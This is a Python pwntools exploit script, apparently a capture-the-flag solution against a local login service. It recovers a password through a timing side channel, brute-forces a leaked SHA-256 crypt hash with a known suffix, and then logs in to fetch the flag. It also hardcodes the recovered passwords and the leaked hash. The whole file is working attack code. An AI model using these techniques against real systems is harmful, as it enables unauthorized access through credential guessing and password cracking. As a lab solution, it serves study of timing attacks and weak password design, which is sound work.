from pwn import *
import time
import os
import crypt
import getopt
import sys
from itertools import product

# /tmp/whatthehack
HOST = "localhost"
PORT = 10004
context.log_level = "warning"
printable_ascii = ['_', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '`', '{', '|', '}', '~']

ubuntu_password = "F0r7uNe_f4V0r5_the_|3R4ve"
dave_password = "oP7dave"
leaked_hash = "$5$RByrWzKkQroXD$jgzSfKmMS/O.6pP0TEIZitkB.gUSqEy5s1vLoklivU5"
salt = "RByrWzKkQroXD"

BYPASS_PHASE1 = False
BYPASS_PHASE2 = False

def help():
    print("Usage: python3 exploit.py --bypass=<phase>")
    print("Options:")
    print("  --bypass=<level>  Bypass the specified phase.")
    print("                    1: phase1, 2: phase2, 3: both")
    print("  -h, --help        Show this tooltip.")

try:
    opts, args = getopt.getopt(sys.argv[1:], "h", ["help", "bypass="])
except getopt.GetoptError as err:
    print(err)
    sys.exit(1)

for o, a in opts:
    if o in ("-h", "--help"):
        help()
        sys.exit(0)
    elif o in ("--bypass"):
        if a == "1":
            BYPASS_PHASE1 = True
            BYPASS_PHASE2 = False
        elif a == "2":
            BYPASS_PHASE1 = False
            BYPASS_PHASE2 = True
        elif a == "3":
            BYPASS_PHASE1 = True
            BYPASS_PHASE2 = True
        else:
            print("Invalid option for --bypass. Use 1, 2, or 3.")
            sys.exit(1)
    else:
        assert False, "Unhandled option"

def make_process():
    while True:
        try:
            p = remote(HOST, PORT)
            return p
        except Exception as e:
            print(f"Error connecting to {HOST}:{PORT} - {e}, retrying...")
            time.sleep(1)

def check(prefix):
    hashed = crypt.crypt(f"{prefix}dave", f"$5${salt}")
    if(hashed == leaked_hash):
        return f"{prefix}dave"
    return None

def phase1():
    prefix = ''
    done = False
    while(True):
        print(f"Found prefix: {prefix}, trying: ", end="", flush=True)
        for c in printable_ascii:
            trying = prefix + c
            p = make_process()
            login_prompt = p.recvuntil(b"ubuntu login: ")
            p.sendline(trying.encode())
            res = p.recvall(timeout = len(trying) * 0.8)
            if res:
                if b"Incorrect password!" in res:
                    print(f"{c}", end="", flush=True)
                    p.close()
                else:
                    prefix = trying
                    print(f"{c}, ... found: {c}.", flush=True)
                    done = True
                    p.close()
                    break
            else:
                prefix = trying
                print(f"{c}, ... found: {c}.", flush=True)
                p.close()
                break
        if done:
            break
    print(f"[*] Found password: {prefix}")
    return prefix

def phase2():
    dave_pw = ""
    total_calc = len(printable_ascii) ** 3
    cnt = 0
    print(f"Progress will be shown every 10000 iterations. If password is found, it will be shown immediately.")
    for i, j, k in product(printable_ascii, repeat=3):
        prefix = i + j + k
        result = check(prefix)
        if result:
            dave_pw = result
            break
        if(cnt % 2000 == 0):
            if(cnt % 10000 == 0):
                print()
                print(f"{cnt} / {total_calc}, {cnt / total_calc * 100:.2f}% proceed.", end="", flush=True)
            print(".", end="", flush=True)
        cnt = cnt + 1
    print()
    print(f"[*] Found password: {dave_pw}")
    return dave_pw

def get_flag(key1, key2):
    p = make_process()
    e = p.recvuntil(b"ubuntu login: "); print(e.decode())
    p.sendline(key1.encode())
    time.sleep(5)
    e = p.recvuntil(b"(1-4) >>>"); print(e.decode())
    p.sendline("4".encode())
    e = p.recvuntil(b"password for dave: "); print(e.decode())
    p.sendline(key2.encode())
    time.sleep(1)
    e = p.recvall(timeout = 1); print(e.decode())

def main():
    print("This script will take a while to run. If you want to bypass the phases, set BYPASS_PHASE1 and BYPASS_PHASE2 to True.")
    print("You can use --bypass options to bypass the phases. More info in --help.")
    if(BYPASS_PHASE1):
        print("[*] Phase1 bypassed.")
        key1 = ubuntu_password
    else:
        key1 = phase1()
    if(BYPASS_PHASE2):
        print("[*] Phase2 bypassed.")
        key2 = dave_password
    else:
        key2 = phase2()
    print(f"[*] Key1: {key1}")
    print(f"[*] Key2: {key2}")
    get_flag(key1, key2)

if __name__ == "__main__":
    main()